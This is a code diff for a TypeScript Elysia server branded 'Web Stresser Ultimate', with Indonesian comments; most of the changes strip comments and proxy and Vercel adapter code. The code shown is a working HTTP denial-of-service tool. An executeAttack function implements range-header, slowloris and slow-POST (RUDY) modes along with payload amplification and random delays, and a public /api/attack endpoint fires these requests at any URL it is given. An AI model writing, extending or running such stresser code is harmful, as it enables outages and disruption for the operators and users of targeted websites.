@@ -11,14 +11,13 @@ function randomString(n: number): string {
 function generateAmplificationPayload(kb: number): string {
   if (kb <= 0) return '';
   const size = kb * 1024;
-  // pola acak menghindari kompresi
   const chunk = 'X'.repeat(1024);
   const repeat = Math.floor(size / chunk.length);
   const remainder = size % chunk.length;
   return chunk.repeat(repeat) + chunk.slice(0, remainder);
 }
 
-// In-memory active users (simple, non-persistent)
+// In-memory active users
 const activeUsers = new Map<string, number>();
 setInterval(() => {
   const now = Date.now();
@@ -27,7 +26,6 @@ setInterval(() => {
   }
 }, 30000);
 
-// ======================== Core Attack Function ========================
 interface AttackParams {
   url: string;
   method: string;
@@ -48,8 +46,7 @@ async function executeAttack(params: AttackParams): Promise<any> {
   let {
     url, method, headers, body,
     timeout, retryCount, randomDelay,
-    keepAlive, useProxy, proxyList,
-    attackType, amplifyKB
+    keepAlive, attackType, amplifyKB,
   } = params;
 
   let finalMethod = method.toUpperCase();
@@ -58,15 +55,13 @@ async function executeAttack(params: AttackParams): Promise<any> {
   let finalBody = body || '';
   let useBody = false;
 
-  // Random delay sebelum request (simulasi)
+  // Random delay sebelum request
   if (randomDelay > 0) {
     await new Promise(r => setTimeout(r, Math.random() * randomDelay));
   }
 
-  // Amplification payload
   const ampPayload = generateAmplificationPayload(amplifyKB);
 
-  // Modifikasi berdasarkan attack type
   switch (attackType) {
     case 'range':
       finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
@@ -85,20 +80,18 @@ async function executeAttack(params: AttackParams): Promise<any> {
       break;
     case 'slowloris':
       finalHeaders['Connection'] = 'keep-alive';
-      // tidak tambah body, hanya keep-alive
       break;
     case 'rudy':
-      // delay 2 detik (simulasi slow POST)
       await new Promise(r => setTimeout(r, 2000));
       finalBody = body + ampPayload;
       useBody = true;
       break;
-    default: // normal
+    default:
       finalBody = body + ampPayload;
       useBody = true;
   }
 
-  // Aturan untuk GET jika amplification besar
+  // Jika amplification besar dan method GET/HEAD, ubah ke POST
   if (amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
     finalMethod = 'POST';
     useBody = true;
@@ -109,14 +102,9 @@ async function executeAttack(params: AttackParams): Promise<any> {
     useBody = false;
   }
 
-  // Header tambahan wajib
   if (!finalHeaders['Accept']) finalHeaders['Accept'] = '*/*';
   if (keepAlive) finalHeaders['Connection'] = 'keep-alive';
   else finalHeaders['Connection'] = 'close';
-
-  // Proxy support sederhana (lewat fetch, bisa ditambahkan)
-  // Untuk prod, bisa gunakan `https-proxy-agent` tetapi di Vercel terbatas.
-  // Kita lewati proxy di sini untuk memudahkan (bisa ditambahkan nanti).
 
   const fetchOptions: any = {
     method: finalMethod,
@@ -171,10 +159,8 @@ async function executeAttack(params: AttackParams): Promise<any> {
 }
 
 // ======================== Elysia Server ========================
-const app = new Elysia()
-  // Middleware global (opsional)
+export const app = new Elysia()
   .onBeforeHandle(({ request }) => {
-    // CORS sederhana
     if (request.method === 'OPTIONS') {
       return new Response(null, {
         headers: {
@@ -185,13 +171,11 @@ const app = new Elysia()
       });
     }
   })
-  // Endpoint status
   .get('/api/status', () => ({
     status: 'ok',
     message: 'Web Stresser Ultimate - Elysia Engine',
     version: '13.0.0',
   }))
-  // Endpoint attack
   .post('/api/attack', async ({ body }) => {
     const result = await executeAttack(body as AttackParams);
     return result;
@@ -212,7 +196,6 @@ const app = new Elysia()
       amplifyKB: t.Number(),
     }),
   })
-  // Endpoint heartbeat untuk active users
   .get('/api/heartbeat', ({ request }) => {
     const ip = request.headers.get('x-forwarded-for') || 'unknown';
     const ua = request.headers.get('user-agent') || 'unknown';
@@ -220,15 +203,6 @@ const app = new Elysia()
     activeUsers.set(key, Date.now());
     return { active: activeUsers.size };
   });
-
-// ======================== Handler untuk Vercel ========================
-// Kita ekspor handler untuk digunakan oleh Vercel
-// Karena Vercel menggunakan format serverless, kita perlu menyesuaikan.
-// Kita akan buat export default yang mengembalikan handler yang sesuai.
-// Atau kita bisa gunakan adapter @elysiajs/vercel
-
-import { vercel } from '@elysiajs/vercel';
-export const handler = vercel(app);
 
 // ======================== Jalankan jika bukan di Vercel ========================
 if (process.env.NODE_ENV !== 'production') {
